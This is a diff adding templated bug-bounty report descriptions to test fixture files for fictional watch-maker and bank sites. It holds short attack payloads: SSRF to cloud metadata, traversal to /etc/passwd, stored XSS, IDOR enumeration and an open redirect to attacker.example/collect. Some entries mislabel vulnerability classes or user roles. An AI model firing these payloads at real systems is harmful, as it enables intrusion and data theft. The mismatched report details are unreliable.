+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22830,7 +23001,8 @@
           "offset": "4d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://dealers.felsentor-watchworks.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -22949,7 +23121,8 @@
           "offset": "3d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23056,7 +23229,8 @@
           "offset": "4d 6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23190,7 +23364,8 @@
           "offset": "23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://dealers.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23338,7 +23513,8 @@
           "offset": "4d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23473,7 +23649,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://dealers.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23644,7 +23821,8 @@
           "offset": "7d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23799,7 +23977,8 @@
           "offset": "8d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://warranty.felsentor-watchworks.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23947,7 +24126,8 @@
           "offset": "4d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24106,7 +24286,8 @@
           "offset": "3d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24237,7 +24418,8 @@
           "offset": "3d 3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://dealers.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24353,7 +24535,8 @@
           "offset": "4d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24453,7 +24636,8 @@
           "offset": "5d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24601,7 +24785,8 @@
           "offset": "8d 18h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24715,7 +24900,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/glaciervault_bank_reports.json b/fixtures/reports/glaciervault_bank_reports.json
index 87a90be..5cc2797 100644
--- a/fixtures/reports/glaciervault_bank_reports.json
+++ b/fixtures/reports/glaciervault_bank_reports.json
@@ -130,7 +130,8 @@
           "offset": "10d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "During routine exploratory testing of the transfer creation flow, I identified that user-supplied content submitted as the SEPA transfer memo is stored without server-side sanitization and later rendered into the banker console queue and detail templates using an unsafe rendering primitive. As a result, an attacker-controlled retail user can craft a transfer with a memo containing an HTML/JS payload that executes automatically in the context of any authenticated banker who views the queue or the transfer detail. This constitutes stored XSS in a high-privilege back-office surface. The absence of a restrictive Content Security Policy on the affected pages further increases exploit reliability and enables exfiltration techniques. This issue presents a realistic path to session takeover, CSRF-like privileged actions, and potential lateral movement into internal tooling that implicitly trusts banker sessions.\n\n### Technical analysis\n- Vulnerability class: **Stored/Reflected XSS**\n- Affected target: `https://banking.glaciervaultbank.foo/app/transfer`\n- Preconditions: authenticated user: authenticated retail user; app version: Banking UI 2025.09.12-1\n\n```javascript\n// Sanitize and HTML-encode untrusted data before DOM insertion\nconst unsafe = req.body.subject;\n// BAD\ndocument.querySelector('#subject').innerHTML = unsafe;\n// GOOD\ndocument.querySelector('#subject').textContent = unsafe;\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Login and initiate a SEPA transfer from Checking -> Savings.\n- Set memo to <svg onload=alert(1)> and submit.\n- Fetch created transfer via GET /api/v2/transfers/{id} and confirm raw memo is persisted.\n- Logout. Login as banker to https://banking.glaciervaultbank.foo/console and open Queue.\n- Observe alert on queue load as memo is rendered without encoding.\n- Navigate to transfer detail; payload executes a second time in the detail view.\n\n### Recommendations\n- HTML-encode untrusted data before DOM insertion.\n- Prefer `textContent`/safe templating.\n- Deploy strict CSP; strip dangerous tags/attributes.\n"
     },
     "triager": {
       "status": "accepted",
@@ -314,7 +315,8 @@
           "offset": "5d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "While validating access controls around statement delivery, I discovered that the `GET /api/v2/documents/{docId}` endpoint authorizes access solely based on the presence of a valid session and does not verify resource ownership. By incrementing or decrementing the numeric identifier, I was able to retrieve PDF statements belonging to other customers. The issue appears systemic across adjacent identifiers, suggesting predictable sequencing and missing object-level authorization. This leads to exposure of sensitive financial information (names, masked IBANs, account summaries) and facilitates targeted collection for high-value customers if combined with business logic and timing. Short-term mitigations include strict ownership checks and signed, time-limited URLs; long-term mitigations include using opaque identifiers and rate limiting enumeration patterns.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.glaciervaultbank.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated retail user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Login and obtain your latest statement ID from /api/v2/statements/last.\n- Call GET /api/v2/documents/{yourId} -> 200 PDF.\n- Increment ID: GET /api/v2/documents/{yourId+1} -> 200 PDF for a different user.\n- Repeat with +2, +3 to confirm enumeration; observe different names in PDF metadata.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -534,7 +536,8 @@
           "offset": "10d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The password reset flow loads a third-party analytics script on the tokenized reset page. When users click embedded help/FAQ links that navigate cross-domain, the browser includes the full URL in the Referer header, which contains the sensitive reset token. This token is then visible to the analytics vendor (and potentially to any intermediaries with log access), enabling account takeover within the token’s lifetime. The risk is exacerbated by the 30-minute TTL and the lack of referrer policy restrictions on the sensitive route. I verified leakage by inspecting requests on the analytics endpoint and confirmed that navigating away from the reset page propagates the full tokenized URL in Referer.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.glaciervaultbank.foo/reset?token=REDACTED`\n- Preconditions: authenticated user: resetting user; app version: Auth 2025.09.10\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request a reset link for your account.\n- Open the tokenized reset URL and click the embedded 'help' link to the knowledge base (different domain).\n- Observe that the analytics endpoint receives a request with the Referer header leaking the full tokenized reset URL.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -710,7 +713,8 @@
           "offset": "1d 23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.glaciervaultbank.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -854,7 +858,8 @@
           "offset": "5d 9h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -965,7 +970,8 @@
           "offset": "7d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1092,7 +1098,8 @@
           "offset": "1d 17h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1219,7 +1226,8 @@
           "offset": "6d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.glaciervaultbank.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1348,7 +1356,8 @@
           "offset": "6d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1508,7 +1517,8 @@
           "offset": "5d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1635,7 +1645,8 @@
           "offset": "4d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://banking.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1749,7 +1760,8 @@
           "offset": "4d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://banking.glaciervaultbank.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1897,7 +1909,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
